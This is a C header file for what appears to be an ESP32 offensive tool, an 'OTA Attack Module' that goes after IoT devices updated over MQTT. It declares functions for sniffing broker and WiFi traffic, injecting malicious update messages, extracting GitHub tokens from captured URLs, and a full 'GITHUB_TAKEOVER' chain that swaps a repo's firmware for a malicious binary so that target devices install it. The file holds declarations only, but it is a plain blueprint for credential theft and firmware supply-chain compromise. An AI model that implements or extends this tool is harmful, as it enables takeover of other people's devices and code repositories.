/*
 * ota_attack.h - OTA Attack Module for MQTT-based Firmware Updates
 *
 * Targets IoT devices that receive OTA firmware updates via MQTT.
 * The typical flow on the target device is:
 *   1. Device connects to MQTT broker
 *   2. Broker publishes update message on an OTA topic
 *   3. Device receives MQTT message containing firmware URL
 *   4. Device downloads firmware binary from URL (e.g. GitHub private repo)
 *   5. Device applies OTA update
 *
 * Two OTA trigger paths:
 *   WAY 1: MQTT broker pushes OTA message → device starts update
 *   WAY 2: Customer-set interval → device polls HTTP endpoint for updates
 *
 * Attack modes:
 *   SNIFF           - Passive MQTT traffic capture
 *   CLIENT          - Connect to MQTT broker as subscriber, capture OTA messages
 *   INJECT          - Publish malicious OTA messages to trigger device update
 *   FETCH           - Download firmware from captured URL for analysis
 *   POLL_SNIFF      - WiFi promiscuous sniff for DNS/HTTP OTA polling patterns
 *   GITHUB_TAKEOVER - Full chain: crack broker → capture URL → crack GitHub
 *                     repo → upload malicious firmware → device auto-updates
 *
 * Key capabilities:
 *   - Connect to target WiFi network (AP+STA dual mode)
 *   - Connect to MQTT broker (with or without credentials)
 *   - Subscribe to OTA-related topics (wildcard support)
 *   - Capture firmware download URLs from MQTT payloads
 *   - Extract GitHub tokens, repo URLs, and access credentials
 *   - Parse GitHub URLs to extract owner/repo/path/branch
 *   - Access GitHub private repos via extracted tokens (REST API)
 *   - List repo contents, download individual files
 *   - Upload/replace firmware binaries in GitHub repos
 *   - Download firmware binaries via HTTP/HTTPS
 *   - Inject custom OTA messages to the target device
 *   - DNS/HTTP promiscuous sniff for interval-based OTA check patterns
 *   - Automated full-chain attack (GITHUB_TAKEOVER mode)
 *   - Full status reporting for web dashboard integration
 *
 * Thread safety:
 *   - running is volatile bool: set from stop()/timer, read in task
 *   - Counters are volatile uint32_t: atomic on 32-bit Xtensa
 *   - cfg is protected by mutex
 *   - timeout_fired is volatile for cross-task visibility
 *
 * Dependencies:
 *   - WiFi STA (connects to target network)
 *   - esp_mqtt client
 *   - esp_http_client (firmware download + GitHub API)
 *   - cJSON
 *   - esp_timer
 *   - FreeRTOS
 */

#ifndef OTA_ATTACK_H
#define OTA_ATTACK_H

#include <stdbool.h>
#include <stdint.h>
#include "cJSON.h"

/* ------------------------------------------------------------------ */
/*  Attack mode                                                        */
/* ------------------------------------------------------------------ */

typedef enum {
    OTA_MODE_SNIFF           = 0,  /* Passive MQTT traffic capture            */
    OTA_MODE_CLIENT          = 1,  /* Connect to MQTT broker as subscriber    */
    OTA_MODE_INJECT          = 2,  /* Publish malicious OTA messages          */
    OTA_MODE_FETCH           = 3,  /* Download firmware from URL              */
    OTA_MODE_POLL_SNIFF      = 4,  /* WiFi sniff for DNS/HTTP OTA polling     */
    OTA_MODE_GITHUB_TAKEOVER = 5,  /* Full chain: broker → URL → repo → push */
} ota_attack_mode_t;

/* ------------------------------------------------------------------ */
/*  Attack state                                                       */
/* ------------------------------------------------------------------ */

typedef enum {
    OTA_STATE_IDLE = 0,
    OTA_STATE_WIFI_CONNECTING,    /* Connecting to target WiFi       */
    OTA_STATE_MQTT_CONNECTING,    /* Connecting to MQTT broker       */
    OTA_STATE_SNIFFING,           /* Passive MQTT sniff active       */
    OTA_STATE_SUBSCRIBED,         /* MQTT client subscribed          */
    OTA_STATE_WAITING_OTA,        /* Waiting for OTA message         */
    OTA_STATE_DOWNLOADING,        /* Downloading firmware            */
    OTA_STATE_DOWNLOADED,         /* Firmware download complete      */
    OTA_STATE_INJECTING,          /* Injecting OTA message           */
    OTA_STATE_INJECTED,           /* OTA message injected            */
    OTA_STATE_POLL_SNIFFING,      /* WiFi promiscuous sniff active   */
    OTA_STATE_POLL_DNS_FOUND,     /* DNS query captured              */
    OTA_STATE_POLL_HTTP_FOUND,    /* HTTP OTA check URL found        */
    OTA_STATE_GH_PARSING_URL,     /* Parsing GitHub URL structure    */
    OTA_STATE_GH_ACCESSING_REPO,  /* Accessing GitHub repo via API   */
    OTA_STATE_GH_LISTING_FILES,   /* Listing repo files              */
    OTA_STATE_GH_UPLOADING,       /* Uploading malicious firmware    */
    OTA_STATE_GH_UPLOADED,        /* Firmware uploaded successfully  */
    OTA_STATE_GH_WAITING_DEVICE,  /* Waiting for device to pull update */
    OTA_STATE_DISCONNECTED,       /* Lost connection                 */
    OTA_STATE_ERROR,              /* Error state                     */
} ota_attack_state_t;

/* ------------------------------------------------------------------ */
/*  Captured MQTT message entry                                        */
/* ------------------------------------------------------------------ */

#define OTA_MAX_CAPTURED_MSGS    32
#define OTA_MAX_PAYLOAD_LEN      512
#define OTA_MAX_TOPIC_LEN        128
#define OTA_MAX_URL_LEN          256
#define OTA_MAX_FIRMWARE_SIZE    (512 * 1024)  /* 512 KB max firmware */

typedef struct {
    char topic[OTA_MAX_TOPIC_LEN];
    char payload[OTA_MAX_PAYLOAD_LEN];
    int64_t timestamp_ms;
} ota_msg_entry_t;

/* ------------------------------------------------------------------ */
/*  Captured URL entry                                                 */
/* ------------------------------------------------------------------ */

#define OTA_MAX_CAPTURED_URLS    16
#define OTA_MAX_DNS_ENTRIES     32
#define OTA_MAX_DNS_NAME_LEN    128
#define OTA_MAX_HTTP_ENTRIES    16
#define OTA_MAX_HTTP_URL_LEN    256

typedef struct {
    char url[OTA_MAX_URL_LEN];
    char source_topic[OTA_MAX_TOPIC_LEN];
    int64_t timestamp_ms;
    bool has_github_token;
    bool downloaded;
    uint32_t firmware_size;
} ota_url_entry_t;

/* ------------------------------------------------------------------ */
/*  Captured DNS query entry (for POLL_SNIFF mode)                     */
/* ------------------------------------------------------------------ */

typedef struct {
    char domain[OTA_MAX_DNS_NAME_LEN];   /* Queried domain name       */
    uint8_t client_ip[4];                /* Source IP (device IP)      */
    uint8_t server_ip[4];                /* DNS server IP              */
    int64_t timestamp_ms;
    bool is_ota_related;                 /* Domain matches OTA pattern */
} ota_dns_entry_t;

/* ------------------------------------------------------------------ */
/*  Captured HTTP OTA check entry (for POLL_SNIFF mode)                */
/* ------------------------------------------------------------------ */

typedef struct {
    char method[8];                       /* GET/POST                   */
    char host[128];                       /* Host header value          */
    char path[OTA_MAX_HTTP_URL_LEN];      /* Request path + query       */
    char full_url[OTA_MAX_HTTP_URL_LEN];  /* Full reconstructed URL     */
    uint8_t client_ip[4];                 /* Source IP                  */
    int64_t timestamp_ms;
    bool is_ota_related;                  /* URL matches OTA pattern    */
} ota_http_entry_t;

/* ------------------------------------------------------------------ */
/*  GitHub repo info (parsed from captured URL)                        */
/* ------------------------------------------------------------------ */

#define OTA_GH_OWNER_LEN    64
#define OTA_GH_REPO_LEN     64
#define OTA_GH_PATH_LEN     128
#define OTA_GH_BRANCH_LEN   32
#define OTA_GH_TOKEN_LEN    128
#define OTA_GH_SHA_LEN      41
#define OTA_GH_API_RESP_LEN (16 * 1024)  /* 16 KB for GitHub API response */

typedef struct {
    char owner[OTA_GH_OWNER_LEN];         /* Repo owner/org            */
    char repo[OTA_GH_REPO_LEN];           /* Repo name                 */
    char path[OTA_GH_PATH_LEN];           /* File path in repo         */
    char branch[OTA_GH_BRANCH_LEN];       /* Branch (default main)     */
    char token[OTA_GH_TOKEN_LEN];         /* Extracted access token    */
    char file_sha[OTA_GH_SHA_LEN];        /* Current file SHA (for update) */
    bool  token_valid;                     /* Token has repo write access */
    bool  parsed;                          /* URL was successfully parsed */
} ota_github_repo_t;

/* ------------------------------------------------------------------ */
/*  Configuration (passed to ota_attack_start_config)                  */
/* ------------------------------------------------------------------ */

typedef struct {
    ota_attack_mode_t mode;         /* Attack mode                     */

    /* WiFi connection (all modes except POLL_SNIFF without STA) */
    char wifi_ssid[33];             /* Target WiFi SSID                */
    char wifi_password[64];         /* Target WiFi password            */

    /* MQTT broker (CLIENT / INJECT / GITHUB_TAKEOVER modes) */
    char mqtt_broker[128];          /* Broker hostname or IP           */
    uint16_t mqtt_port;             /* Broker port (default 1883)      */
    char mqtt_username[64];         /* Username (optional)             */
    char mqtt_password[64];         /* Password (optional)             */
    char mqtt_client_id[32];        /* Client ID (default auto)        */

    /* Topic subscription (CLIENT mode) */
    char subscribe_topic[128];      /* Topic to subscribe (default #)  */

    /* Injection (INJECT mode) */
    char inject_topic[128];         /* Topic to publish to             */
    char inject_payload[512];       /* Payload to publish (JSON)       */
    uint32_t inject_count;          /* Number of times to inject (1)   */
    uint32_t inject_interval_ms;    /* Interval between injections (0) */

    /* Firmware fetch (FETCH mode) */
    char firmware_url[256];         /* URL to download firmware from   */
    bool verify_ssl;                /* Verify SSL certs (default false)*/

    /* Poll sniff (POLL_SNIFF mode) */
    uint8_t  target_device_ip[4];   /* Target device IP to filter (0=any) */
    bool     capture_dns;           /* Capture DNS queries (default true) */
    bool     capture_http;          /* Capture HTTP requests (default true) */

    /* GitHub takeover (GITHUB_TAKEOVER mode) */
    char gh_firmware_path[OTA_GH_PATH_LEN]; /* Path in repo to replace (e.g. "firmware.bin") */
    char gh_branch[OTA_GH_BRANCH_LEN];      /* Branch to push to (default: main) */
    char gh_commit_msg[128];                 /* Commit message for malicious firmware */
    uint8_t *malicious_firmware;             /* Pointer to malicious firmware data   */
    uint32_t malicious_firmware_size;        /* Size of malicious firmware           */
    int gh_captured_url_index;               /* Which captured URL to use (-1 = first GitHub) */

    /* General */
    uint32_t timeout_sec;           /* Auto-stop timeout (default 300) */
} ota_attack_config_t;

/* ------------------------------------------------------------------ */
/*  Lifecycle                                                          */
/* ------------------------------------------------------------------ */

/** One-time init -- call from app_main or module setup. */
void ota_attack_init(void);

/** Start with mode and target (simplified API). */
void ota_attack_start(ota_attack_mode_t mode, const char *wifi_ssid,
                      const char *wifi_password);

/** Start with full config. */
void ota_attack_start_config(const ota_attack_config_t *cfg);

/** Stop the attack and clean up. */
void ota_attack_stop(void);

/* ------------------------------------------------------------------ */
/*  Status getters  (safe to call from any task / HTTP handler)         */
/* ------------------------------------------------------------------ */

bool              ota_attack_is_running(void);
ota_attack_state_t ota_attack_get_state(void);
const char       *ota_attack_get_state_str(void);
ota_attack_mode_t ota_attack_get_mode(void);

uint32_t ota_attack_get_mqtt_msg_count(void);
uint32_t ota_attack_get_url_count(void);
uint32_t ota_attack_get_github_url_count(void);
uint32_t ota_attack_get_inject_count(void);
uint32_t ota_attack_get_download_count(void);
uint32_t ota_attack_get_fail_count(void);
uint32_t ota_attack_get_dns_count(void);
uint32_t ota_attack_get_http_count(void);
uint32_t ota_attack_get_ota_dns_count(void);
uint32_t ota_attack_get_ota_http_count(void);
int32_t  ota_attack_get_elapsed_sec(void);
int32_t  ota_attack_get_remaining_sec(void);
bool     ota_attack_was_timeout(void);

/** Returns a new cJSON object -- caller must delete. */
cJSON  *ota_attack_get_status_json(void);

/* ------------------------------------------------------------------ */
/*  Interactive operations                                              */
/* ------------------------------------------------------------------ */

/** Get captured MQTT messages as JSON string. */
const char *ota_attack_get_captured_messages_json(void);

/** Get captured URLs as JSON string. */
const char *ota_attack_get_urls_json(void);

/** Get GitHub-specific URLs/tokens as JSON string. */
const char *ota_attack_get_github_urls_json(void);

/** Manually inject an OTA message (topic + payload).
 *  Only works in CLIENT/SNIFF mode while connected. */
bool ota_attack_inject_message(const char *topic, const char *payload);

/** Trigger firmware download from a captured URL index.
 *  Returns true if download started. */
bool ota_attack_download_firmware(int url_index);

/** Get firmware download result (size, status) as JSON string. */
const char *ota_attack_get_download_result_json(void);

/** Get captured DNS queries as JSON string (POLL_SNIFF mode). */
const char *ota_attack_get_dns_entries_json(void);

/** Get captured HTTP OTA check requests as JSON string. */
const char *ota_attack_get_http_entries_json(void);

/* ------------------------------------------------------------------ */
/*  GitHub Repo Takeover API                                           */
/* ------------------------------------------------------------------ */

/** Parse a GitHub URL to extract owner/repo/path/token.
 *  Fills in the ota_github_repo_t structure.
 *  Returns true if URL was successfully parsed. */
bool ota_attack_parse_github_url(const char *url, ota_github_repo_t *out);

/** Access a GitHub repo using an extracted token.
 *  Verifies token has access and determines read/write permissions.
 *  Returns true if token is valid and has at least read access. */
bool ota_attack_github_access_repo(ota_github_repo_t *repo);

/** List files in a GitHub repo at the given path.
 *  Returns a JSON string (caller does NOT free - static buffer).
 *  Format: [{"name":"file.bin","path":"firmware.bin","sha":"abc...",
 *            "size":12345,"type":"file"},...] */
const char *ota_attack_github_list_files(ota_github_repo_t *repo,
                                          const char *path);

/** Get the SHA of a file in the repo (needed to update/replace it).
 *  Fills repo->file_sha. Returns true on success. */
bool ota_attack_github_get_file_sha(ota_github_repo_t *repo,
                                     const char *file_path);

/** Upload/replace a firmware file in the GitHub repo.
 *  Uses the GitHub Contents API (PUT /repos/{owner}/{repo}/contents/{path}).
 *  If repo->file_sha is set, the existing file is replaced.
 *  Returns true on successful upload. */
bool ota_attack_github_upload_firmware(ota_github_repo_t *repo,
                                        const uint8_t *firmware_data,
                                        uint32_t firmware_size,
                                        const char *target_path,
                                        const char *commit_msg);

/** Full automated attack chain: sniff MQTT → capture URL → parse GitHub
 *  repo → verify token → upload malicious firmware → wait for device update.
 *  This is what GITHUB_TAKEOVER mode runs internally.
 *  Returns true if malicious firmware was successfully uploaded. */
bool ota_attack_github_takeover_chain(const char *wifi_ssid,
                                       const char *wifi_password,
                                       const char *mqtt_broker,
                                       uint16_t mqtt_port,
                                       const uint8_t *malicious_fw,
                                       uint32_t malicious_fw_size,
                                       uint32_t wait_for_device_sec);

/** Get the current GitHub repo info (after parsing/accessing).
 *  Returns a JSON string (static buffer, do NOT free). */
const char *ota_attack_get_github_repo_json(void);

/** Get the last GitHub API operation result as JSON. */
const char *ota_attack_get_github_result_json(void);

#endif /* OTA_ATTACK_H */
